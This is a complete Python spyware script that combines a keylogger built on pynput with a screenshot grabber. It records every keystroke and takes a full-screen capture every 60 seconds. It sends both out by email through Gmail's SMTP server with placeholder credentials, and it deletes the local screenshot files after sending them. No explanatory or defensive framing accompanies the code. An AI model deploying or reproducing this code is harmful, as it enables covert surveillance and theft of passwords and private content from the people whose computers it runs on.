#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
import time
import os
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started\n"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        else:
            current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, self.email, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, to, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


class Screenshotter:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.email = email
        self.password = password

    def take_screenshot(self):
        current_time = time.strftime('%Y%m%d-%H%M%S')
        screenshot = ImageGrab.grab()
        screenshot_path = f'{current_time}.png'
        screenshot.save(screenshot_path)
        self.send_mail(screenshot_path)
        os.remove(screenshot_path)

    def report(self):
        self.take_screenshot()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, attachment_path):
        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                message = MIMEMultipart()
                message['From'] = self.email
                message['To'] = self.email
                message['Subject'] = 'Screenshot'
                with open(attachment_path, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename= {attachment_path}')
                message.attach(part)
                text = message.as_string()
                server.sendmail(self.email, self.email, text)
        except Exception as e:
            print(f'Unable to send email: {e}')

    def start(self):
        self.report()


if __name__ == '__main__':
    keylogger = Keylogger(1500, "emailaddress", "password")
    screenshotter = Screenshotter(60, "emailaddress", "password")

    keylogger_thread = threading.Thread(target=keylogger.start)
    screenshotter_thread = threading.Thread(target=screenshotter.start)

    keylogger_thread.start()
    screenshotter_thread.start()
